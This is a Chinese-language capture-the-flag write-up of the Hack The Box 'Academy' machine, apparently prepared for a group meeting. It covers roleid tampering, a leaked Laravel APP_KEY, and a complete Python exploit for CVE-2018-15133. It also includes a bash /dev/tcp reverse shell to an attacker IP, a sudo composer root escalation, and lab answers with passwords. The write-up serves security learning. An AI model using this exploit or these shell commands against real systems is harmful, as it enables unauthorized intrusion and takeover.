# Academy@HTB Retired Machine[Linux][Easy]
> 黃廷翰 2025/04/24 Group Meeting 報告
>
> HackMD link: https://hackmd.io/@han20011222/SycS2J5AJe

![image](https://hackmd.io/_uploads/Skwx1e90yx.png)
## Contents
[TOC]

## Machine info
Academy is an easy difficulty Linux machine that features an Apache server hosting a PHP website. The website is found to be the HTB Academy learning platform. Capturing the user registration request in Burp reveals that we are able to modify the Role ID, which allows us to access an admin portal. This reveals a vhost, that is found to be running on Laravel. Laravel debug mode is enabled, the exposed API Key and vulnerable version of Laravel allow us carry out a deserialization attack that results in Remote Code Execution. Examination of the Laravel `.env` file for another application reveals a password that is found to work for the `cry0l1t3` user, who is a member of the `adm` group. This allows us to read system logs, and the TTY input audit logs reveals the password for the `mrb3n` user. `mrb3n` has been granted permission to execute composer as root using `sudo`, which we can leverage in order to escalate our privileges.

Academy 是一台簡單難度的 Linux 機器，配備一個託管 PHP 網站的 Apache 伺服器。網站已查明為HTB學院學習平台。在 Burp 中擷取使用者註冊請求表示我們能夠修改角色 ID，這使我們能夠存取管理入口網站。這揭示了一個在 Laravel 上運行的 vhost。 Laravel 偵錯模式已啟用，暴露的 API 金鑰和易受攻擊的 Laravel 版本允許我們進行反序列化攻擊，從而導致遠端程式碼執行。檢查另一個應用程式的 Laravel .env 文件，發現一個適用於 cry0l1t3 使用者（adm 群組成員）的密碼。這使我們能夠讀取系統日誌，並且 TTY 輸入審計日誌會揭示 mrb3n 使用者的密碼。 mrb3n 已被授予使用 sudo 以 root 身分執行 composer 的權限，我們可以利用這一點來提升我們的權限。

## 1. Port Scan
Running rustscan `rustscan -a 10.10.10.215 -- -sC -sV`
參數 -a 接的是掃描標的 IP 後面 -- 可以接續 nmap 掃描
-sV: Version Detection 會試著連接每個開放的 port，判斷該服務的版本
-sC: 預設腳本掃描（Default Scripts）
:::success
- 為何 RustScan 比 Nmap 更快？
RustScan 的核心目標是迅速識別目標主機上開放的 TCP 端口。它不進行服務版本探測、作業系統識別或執行 NSE 指令碼等深入分析，這些功能通常由 Nmap 處理。這種專注使得 RustScan 能夠在極短的時間內完成初步掃描。
- 帶 nmap 參數
RustScan 可以將發現的開放端口自動傳遞給 Nmap，讓 Nmap 對這些端口進行更深入的分析，如服務版本探測和漏洞評估。這種分工合作的方式既保留了 RustScan 的速度優勢，又利用了 Nmap 的強大功能。
:::
![image](https://hackmd.io/_uploads/SyTSye5AJg.png)
![image](https://hackmd.io/_uploads/BJ8fgx9Ayx.png)

可以得知：
| Port | 狀態 | 服務 | 額外資訊             |
| ---- | ---- | ---- | -------------------- |
| 22 | Open | SSH  | OpenSSH 8.2p1 Ubuntu |
| 80 | Open | HTTP | Apache 2.4.41, redirect to http://academy.htb/|
| 33060| Open | MySQL X | MySQL X Protocol|
- 22 port : `OpenSSH 8.2p1 Ubuntu 4ubuntu0.1`
    - 表示這是一台 Ubuntu 機器
    - 可能有已知漏洞（?）
- 80 port : `Apache 2.4.41, redirect to http://academy.htb/`
    - Apache 2.4.41
    - HTTP title 提示：網站會導向 `http://academy.htb/` 
- 33060 port : 
    - 查了一下發現是 MySQL 8.0 開始的新功能，主要用於 X Protocol / Document Store(高機率存一些使用者的資訊帳密？)

## 2. Recon 偵查
### A. Redirect
剛剛掃完可以得知這台靶機的 `80 port` 會 redirect to `http://academy.htb/`
![image](https://hackmd.io/_uploads/r1Zg8l9CJx.png)

我們可以 curl 去看看目前 HTTP tittle (確實告知你 HTTP 302 found)
- curl -v 或 --verbose 開啟詳細輸出模式：
可以看到正在連線 IP/port，發送了什麼 HTTP 標頭，收到回應（狀態碼、標頭）
- 302 Found : HTTP 302 Found 重新導向回應碼表示所請求的資源已暫時移動到由 Location 標頭給出的 URL。瀏覽器將重新導向到此頁面，但搜索引擎不會更新對該資源的連結（在 SEO 術語中，這意味著「連結權重」不會傳送到新的 URL）。
(ref:https://developer.mozilla.org/zh-TW/docs/Web/HTTP/Reference/Status/302)

![image](https://hackmd.io/_uploads/SJSqUxcCyx.png)

所以需要設定 `/etc/hosts` 讓我的網頁重新導向時可以順利`redirect to http://academy.htb/`
:::warning
把域名 academy.htb 轉換成對應的 IP 位址（例如 10.10.10.215）

- 為什麼這樣做？
Hack The Box這種滲透測試環境中，你常常會遇到這種網址（像 academy.htb），但它不是真正註冊的網域名稱，也就是說 DNS 找不到這個網址。
- 所以我們手動加在 /etc/hosts 檔案中，就是為了：
    - 可以成功地打開 http://academy.htb
    - 順利 redirect（重新導向）到你靶機的 IP
    - 模擬一個“看起來像真的”網站
:::

- 把 `academy.htb` 加入 /etc/hosts 中，這樣當我們重新進入
```cmd
sudo vi /etc/hosts
```
![image](https://hackmd.io/_uploads/SJ9A8lc01x.png)
當我們設定好網頁導向後就可以來看網頁內容了！（重新導向成功）
![image](https://hackmd.io/_uploads/r1Zgwg5Ckg.png)

### B. 網頁分析
:::warning
我們在一邊進行網頁分析時可以讓一些自動化工具在背後進行掃描（dirseach or gobuster），這些工具或許可以找出一些可以利用的點。
- dirsearch 適合快速部署與入門學習，不需要額外準備太多設定。
- gobuster 則在效率和可擴充性上更強，適合大規模爆破與自動化流程整合。
:::
#### dirsearch
使用 `dirsearch` 爆破路徑可以發現有 `admin.php`, `config.php`, `login.php`, `register.php`
![image](https://hackmd.io/_uploads/Bkw50Uk1xl.png)


#### 1. 觀察網頁
![image](https://hackmd.io/_uploads/r1Zgwg5Ckg.png)
這網頁寫著大大的 HTB ACADEMY ，可以發現網頁右上角寫著LOGIN and REGISTER

View Page Source:
```javascript=
<html lang="en"><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Hack The Box Academy</title>

        <!-- Fonts -->
        <link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet">

        <!-- Styles -->
        <style>
            ...
            ...
        </style>
    </head>
    <body>
        <div class="flex-center position-ref full-height" id="canvas">
            <div class="top-right links">
            ****<a href="http://academy.htb/login.php">Login</a>
            ****<a href="http://academy.htb/register.php">Register</a>
            </div>
            <div class="content">
                <div>
                    <img src="images/logo.svg" height="100px">
                </div>
            </div>
        </div>
    </body>
</html>
```

:::info
可以得知到最重要的地方大概就是此網頁有 `login.php` , `Register.php`,`admin.php` 頁面，那根據經驗應該就是進去然後想辦法去找到 admin 帳號然後提權之類的 ?
:::

#### 2. Burp Suite 進行分析:
##### **LOGIN:**
![image](https://hackmd.io/_uploads/Hy9ugGc0Jg.png)
嘗試帳號密碼 `admin&admin` 發現網頁並沒特別改變
![image](https://hackmd.io/_uploads/HkAZMGqRyg.png)

**REGISTER:**
![image](https://hackmd.io/_uploads/BJf3eM5RJg.png)
page source(可以看到一個hidden type的 name="roleid"):
```html=

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>Register</title>
<link href="https://fonts.googleapis.com/css?family=Nunito:200,600" rel="stylesheet">
<style> ---- </style>
</head>
<body>
    <div class="login_div">
        <form class="login_form" method="POST" autocomplete="off">
            <br/>
            <br/>
            <img src="images/logo.png" class="center" width="130" height="130">
            <br/>
            <br/>
            <table>
                <tr>
                    <td class="form_text" align="left">&nbsp;&nbsp;&nbsp;Username</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="text" id="uid" name="uid" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="password" name="password" /></td>
                </tr>
                <tr>
                    <td class="form_text" align="left"><br/>&nbsp;&nbsp;&nbsp;Repeat Password</td>
                <tr/>
                <tr>
                    <td align="right"><input class="input" size="40" type="password" id="confirm" name="confirm" /></td>
                </tr>
            ****<input type="hidden" value="0" name="roleid" />
            </table>
            <br/><br/>
            <input type="submit" class="button" value="Register"/> 
            </p>
        </form>
    </div>

    <br />


    </div>
    </div>
<div class="footer">
</div>
</div>
</body>
</html>

```
![image](https://hackmd.io/_uploads/H1EuiBSJgl.png)
![image](https://hackmd.io/_uploads/B14MSf5Rke.png)
![image](https://hackmd.io/_uploads/S1RNWQc0Jx.png)

KEY:
:::danger
`16 > uid=VV1N&password=901222&confirm=901222&roleid=0` 發現酷東西 roleid=0 看起來是權限的控制我們可以嘗試註冊一個 roleid=1 的 User 
![image](https://hackmd.io/_uploads/r17r0M9CJg.png)
![image](https://hackmd.io/_uploads/ByMbbm9Aye.png)
:::

**註冊後登入：**
可以看到 User 的登入介面：
![image](https://hackmd.io/_uploads/HyBdTzq0kg.png)

利用剛剛`dirsearch` 找到的 Admin 登入介面：
![image](https://hackmd.io/_uploads/By7ahfvylg.png)

![image](https://hackmd.io/_uploads/H1oD1mq0yl.png)

利用註冊的 Admin 帳號登入：
![image](https://hackmd.io/_uploads/rJAtymqC1g.png)

我成功用註冊的 User 登入 Admin 系統：
![image](https://hackmd.io/_uploads/S1E3RM90yg.png)

發現 Launch Planner 內有內容是待修復的也有網址內容:
:::danger
發現有一個地方 pending 中 ->  Fix issue with dev-staging-01.academy.htb
:::
![image](https://hackmd.io/_uploads/S1sYxQ90ke.png)
1. 初始課程模組已由 cry0l1t3 和 mrb3n 兩位開發者完成
2. 網站的整體設計（UI、排版等）已完成
3. 所有課程模組都經過測試（功能與內容檢查）
4. 針對平台上線前的宣傳活動（行銷、公告等）已完成規劃
5. 系統中使用者權限管理已分開（學生與管理員角色分離）
6. **開發測試站 dev-staging-01.academy.htb 還有未解決的問題**


那我們跟前面步驟一樣將我們的 `/etc/hosts` 加入目標網址讓網頁重可以順利進入`http://dev-staging-01.academy.htb/`
![image](https://hackmd.io/_uploads/rkH9G7c0kx.png)

成功進入了一個叫做`Whoops! There was an error.` 的網頁
![image](https://hackmd.io/_uploads/H19SU7m1gx.png)
![image](https://hackmd.io/_uploads/HJuB2SBJex.png)


## 3. Exploitation 弱點利用
- 這看起來是一個 Laravel 框架寫入日誌失敗的問題：
可以知道 Laravel 是有啟用 debug

![image](https://hackmd.io/_uploads/SJx3vXqR1e.png)

- 思考一下可以利用的點
![image](https://hackmd.io/_uploads/H19SU7m1gx.png)

-  開始漫長的查詢
![image](https://hackmd.io/_uploads/B1X3vmQJxx.png)

- 在他的Error code 更下面可以發現一個名為 laravel 的 framework：
![image](https://hackmd.io/_uploads/SyRE_Xc0Jg.png)

- 發現框架 `laravel` 中的 `APP_KEY` 洩漏
![image](https://hackmd.io/_uploads/HJuB2SBJex.png)
不僅僅發現了 APP_KEY 洩漏 以及機器配置不當 APP_DEBUG = 'true'，允許存取 .env 檔案
![image](https://hackmd.io/_uploads/SJ5Ha6SJgl.png)

- 使用 `searchsploit` 指令查找有關 Laravel 的已知漏洞（Exploit）
![image](https://hackmd.io/_uploads/r14zM4Xkxg.png)
:::warning
searchsploit 是 Exploit Database（exploit-db.com）的本地搜尋工具，預設安裝在 Kali Linux、Parrot OS 這類滲透測試系統上。
它可以讓你離線查找特定軟體或框架的漏洞、漏洞程式碼、PoC（Proof of Concept）等。
:::
- 也可以利用網頁 exploit-db 
![image](https://hackmd.io/_uploads/ryFdfNXygg.png)

### 找到 CVE
:::danger
CVE-2018-15133 是 Laravel 框架（版本 5.5.40 及 5.6.x 至 5.6.29）中的一個嚴重遠端代碼執行（RCE）漏洞。攻擊者若能取得應用程式的 APP_KEY，便可構造特製的 payload，透過 Laravel 的解密與反序列化機制，執行任意 PHP 代碼。
:::

### **CVE復現 - CVE-2018-15133**

Laravel 的加解密機制使用了 .env 中的 APP_KEY 來加密 session 等資料。
而在 Laravel 5.x 的某些版本中，如果網站啟用 debug mode，當錯誤發生時會把 .env 的內容都輸出到頁面上

會導致攻擊者可以輕鬆取得 APP_KEY，進而解密、偽造、再「反序列化」Laravel 的 session cookie。

這個反序列化點沒有被安全防護（例如不驗證物件類型），所以可以構造一個 payload → 遠端執行任意 PHP 代碼

![image](https://hackmd.io/_uploads/ByclBEQ1xl.png)
- 腳本小子大法
![image](https://hackmd.io/_uploads/S1G-V4cR1g.png)
- 可以選擇腳本進行攻擊
![image](https://hackmd.io/_uploads/ryRMHE9Ake.png)

:::warning
OSCP 只能對一台機器使用 msfconsole 工具 所以自己寫 payload 吧！
小小介紹一下 msfconsole 是什麼？
msfconsole 是 Metasploit Framework（MSF） 的核心命令列介面，
可以
- 搜尋與利用漏洞（Exploit）
- 使用現成的 Payload（反向 shell、meterpreter 等）
- 做服務掃描、漏洞驗證、post-exploitation
- 撰寫自訂模組、測試 Payload、內網橫向移動

GPT說的一句話：滲透測試的 Swiss Army Knife（瑞士刀）
:::

**payload:**
Laravel 反序列化 RCE 漏洞：
- 原理簡述（Laravel APP_KEY 反序列化）Laravel 會用 APP_KEY 來加密一些資料，比如 session、remember_me cookies、cache 等。這個漏洞（CVE-2021-3129）是：如果你知道 Laravel 的 APP_KEY，你可以手動構造一個加密資料（payload），Laravel 解密後會反序列化它，如果資料裡面是個惡意的 PHP 對象，會觸發 __destruct() 執行你指定的命令。
![image](https://hackmd.io/_uploads/BkJmJDcAJx.png)

#### Payload:
:::danger
This code was created for educational use not anything illegal. Whatever you do it's your own responsibility.
:::
(ref:https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py)
```python=
#! /usr/bin/env python3

from rich.console import Console
from rich.table import Table
from Crypto import Random
from Crypto.Cipher import AES
from hashlib import sha256
from Crypto.Util.Padding import pad
import hmac
import base64
import json
import argparse
import requests
from signal import signal, SIGINT
from sys import exit

console = Console()

def generate_payload(cmd, key, method=1):
    # Porting phpgcc thing for Laravel RCE php objects - code mostly borrowed from Metasploit's exploit
    if method == 1: # Laravel RCE1
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:15:"Faker\\Generator":1:{s:13:"' + "\x00" + '*' + "\x00" + 'formatters";a:1:{s:8:"dispatch";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 2: # Laravel RCE2
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"' + "\x00" + '*' + "\x00" + 'listeners";a:1:{s:' + str(len(cmd)) + ':"' + cmd + '";a:1:{i:0;s:6:"system";}}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    elif method == 3: # Laravel RCE3
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":1:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:39:"Illuminate\\Notifications\\ChannelManager":3:{s:6:"' + "\x00" + '*' + "\x00" + 'app";s:' + str(len(cmd)) + ':"' + cmd + '";s:17:"' + "\x00" + '*' + "\x00" + 'defaultChannel";s:1:"x";s:17:"' + "\x00" + '*' + "\x00" + 'customCreators";a:1:{s:1:"x";s:6:"system";}}}'
    else: # Laravel RCE4
        payload_decoded = 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:31:"Illuminate\\Validation\\Validator":1:{s:10:"extensions";a:1:{s:0:"";s:6:"system";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";s:' + str(len(cmd)) + ':"' + cmd + '";}'
    value = base64.b64encode(payload_decoded.encode()).decode('utf-8')
    key = base64.b64decode(key)
    return encrypt(value, key)

def encrypt(text, key):
    cipher = AES.new(key,AES.MODE_CBC)
    value = cipher.encrypt(pad(base64.b64decode(text), AES.block_size))
    payload = base64.b64encode(value)
    iv_base64 = base64.b64encode(cipher.iv)
    hashed_mac = hmac.new(key, iv_base64 + payload, sha256).hexdigest()
    iv_base64 = iv_base64.decode('utf-8')
    payload = payload.decode('utf-8')
    data = { 'iv': iv_base64, 'value': payload, 'mac': hashed_mac}
    json_data = json.dumps(data) 
    payload_encoded = base64.b64encode(json_data.encode()).decode('utf-8')
    return payload_encoded

def extractResponse(resp):
    return resp.split('<!DOCTYPE html>')[0] # Ugly but it works, not as good as regex

def key_handler(signal_received, frame):
    print('Alrighty. Bye!')
    exit(0)

def exploit(url, api_key, cmd, method=1):
    payload = generate_payload(cmd, api_key, method)
    return requests.post(url,headers={'X-XSRF-TOKEN': payload})

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('URL', help="Lararel website URL to attack")
    parser.add_argument('API_KEY', help="Laravel website API_KEY encoded in base64")
    parser.add_argument('-c','--command', default='uname -a', help="Command to execute in the vulnerable website, if not specfied will send 'uname -a'")
    parser.add_argument('-m','--method', type=int, choices=[1,2,3,4], default=1, help="Indicates the unserialized payload version to use: 1 = Laravel RCE1 (default), 2 = Laravel RCE2, 3 = Laravel RCE3, 4 = Laravel RCE4")
    parser.add_argument('-i', '--interactive', action="store_true", help="Execute commands interactively, it would mimic a tty")
    args = parser.parse_args()
    
    resp = exploit(args.URL, args.API_KEY, args.command, args.method)
    console.print("\n" + extractResponse(resp.text))

    if args.interactive:
        signal(SIGINT, key_handler)
        console.print('[bold yellow] Running in interactive mode. Press CTRL+C to exit.')
        while True:
            cmd = input('$ ')
            if len(cmd) == 0: continue
            resp = exploit(args.URL, args.API_KEY, cmd, args.method)
            console.print(extractResponse(resp.text))

main()
```
- 利用 payload 取得 shell:
`python3 pwn_laravel.py http://dev-staging-01.academy.htb/ 'dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=' --interactive`
加上 --interactive 功能：
    - 建立一個交互式 shell 介面：像在本機一樣輸入命令，例如 whoami、ls、cat /etc/passwd 等。
    - 持續回應：腳本不會只是打一發 payload 就結束，而是會持續維持與目標的連線並回傳輸出。

![image](https://hackmd.io/_uploads/BJhmeI7kle.png)
- Reverse shell（開 listener，執行 reverse shell)
shell 1: `bash -c 'bash -i >& /dev/tcp/10.10.14.4/4444 0>&1'`
:::success
bash -c '...'
- 叫 Bash 執行引號內的內容（可以是任何 Bash 指令）。

'bash -i'
- 啟動一個 interactive bash shell。
- -i 的意思是「互動式」，允許你輸入指令、得到輸出，像在終端機一樣。

/ >& /dev/tcp/10.10.14.4/4444
- 把「標準輸出」（stdout）和「標準錯誤」（stderr）都重定向到 TCP 連線。
- /dev/tcp/10.10.14.4/4444 是 Bash 的一個特殊裝置，可以直接讓 bash 建立 TCP 連線！

0>&1
- 把「標準輸入」也重定向到這個 TCP 連線。
- 換句話說，整個 shell 的輸入輸出都透過這條 TCP 傳回去。
:::
shell 2: `nc -lvnp 4444`
:::success


| 參數 | 說明 |
| -------- | -------- |
| nc |  Netcat  |
| -l | listen 可以監聽某個 port|
| -v | verbose 把執行過程講清楚（會顯示連線接收的狀態）|
| -n | no DNS 不查詢主機名稱 |
| -p | 4444port 自定義的port 目標把機會打回來4444 |

:::

![image](https://hackmd.io/_uploads/HyTPx8X1lx.png)

- 升級成交互式的 shell
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
啟動一個「偽終端機（PTY）」，模擬出終端介面。
`export TERM=xterm`
`stty raw -echo`
`fg`
raw：讓終端直接傳遞輸入，防止「預處理」。
echo：讓輸入時不會把你打的東西再顯示一次。
把 shell 放回「前台」。
![image](https://hackmd.io/_uploads/r1NwtcQ1xl.png)

## 4. Lateral Movement 橫移


- `cat /var/www/html/academy/.env` 取得.env 之後根據題目提示可以知道是cry0l1t3這名用戶的密碼
![image](https://hackmd.io/_uploads/H1u4qqX1gg.png)
:::warning
- 我有一個奇怪的問題如果沒有題目提示的 User 還有辦法提權嗎
![image](https://hackmd.io/_uploads/rJ4RGJ81gg.png)
![image](https://hackmd.io/_uploads/Bkju5sXklx.png)
```=
www-data@academy:/var/www/html/htb-academy-dev-01/public$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
www-data@academy:/var/www/html/htb-academy-dev-01/public$ 
```
![image](https://hackmd.io/_uploads/rknJRo7yxx.png)
利用db帳密嘗試許多組發現真的只有 cry0l1t3 這名用戶可以順利登入
:::

- 登入`cry0l1t3`使用者帳號
![image](https://hackmd.io/_uploads/ByTTmIXJll.png)

- 切換為 cry0l1t3 使用者後檢查使用者的身份
![image](https://hackmd.io/_uploads/Bk7LcUQyxe.png)

- 查看 TTY 輸入紀錄（找出 mrb3n 密碼)
`aureport --tty`
這指令會列出 Linux audit log 裡面所有 TTY（終端機）相關的事件，像是 su、sudo
![image](https://hackmd.io/_uploads/rkAJm3XJgx.png)


- 切換使用者為 mrb3n
![image](https://hackmd.io/_uploads/S1JOVIQygl.png)

## 5. Privilege Escalation 提權

- 發現 mrb3n可以調用sudo 可以利用 GTFOBins 的 composer 權限提權
![image](https://hackmd.io/_uploads/SymGVkLyge.png)

:::warning
mrb3n 使用者擁有以下 sudo 權限：
(ALL) NOPASSWD: /usr/bin/composer
composer 支援在 composer.json 檔案中設定 scripts，我們可以藉此觸發任意命令執行，達成提權。
:::

![image](https://hackmd.io/_uploads/BkwyVh7yll.png)
1. 在資料夾內撰寫 composer.json：
`TF=$(mktemp -d)`使用 mktemp -d 創建一個乾淨的目錄，避免污染當前目錄。
2. 在資料夾內撰寫 composer.json： 
`echo '{"scripts":{"pwn":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > $TF/composer.json` :這邊用意是創建一個名為 pwn 的 script。指令 /bin/sh -i 0<&3 1>&3 2>&3 是為了讓輸入/輸出流回你自己的終端，成功開出互動式 root shell。
3. 執行 composer，觸發提權：
`sudo composer --working-dir=$TF run-script pwn`
--working-dir=$TF 告訴 composer 使用我們剛剛自定義的 composer.json。
run-script pwn 執行我們設定的惡意腳本。
**執行成功後，使用者將擁有 root 權限的 Shell。**

- 取得 flag
![image](https://hackmd.io/_uploads/rkbEN2mJlg.png)
![image](https://hackmd.io/_uploads/HyrEoLXkxe.png)

- Academy has been Pwned!
![image](https://hackmd.io/_uploads/H1pi_8mJll.png)


## 5. 總結＆Task
1. How many TCP ports are open on the remote host?
Ans: `3`
2. Which scripting language is the website using?
Ans: `php`
3. Which path on the webserver returns an admin login page?
Ans: `/admin.php`
4. Which HTTP POST request parameter on the register page is being used to control the user role?
Ans:`roleid`
5. On the "Admin Launch Planner", the issue regarding which subdomain is still pending to be fixed?
Ans:`dev-staging-01.academy.htb`
6. Which PHP framework is running on the above sub-domain?
`Laravel`
7. Which 2018 CVE is the above PHP framework version vulnerable to?
`CVE-2018-15133`
8. What is the password for the user cry0l1t3 on the remote host?
`mySup3rP4s5w0rd!!`
9. Submit the flag located in the cry0l1t3 user's home directory.
![image](https://hackmd.io/_uploads/H1n42U7Jge.png)
10. Which interesting group is the user cry0l1t3 a part of?
`adm`
11. What is the password for the user mrb3n on the remote host?
`mrb3n_Ac@d3my!`
12. Which command can be run by the user mrb3n as the user root?
`/usr/bin/composer`
13. Submit the flag located on the administrator's desktop.
![image](https://hackmd.io/_uploads/Bk-L28mylx.png)


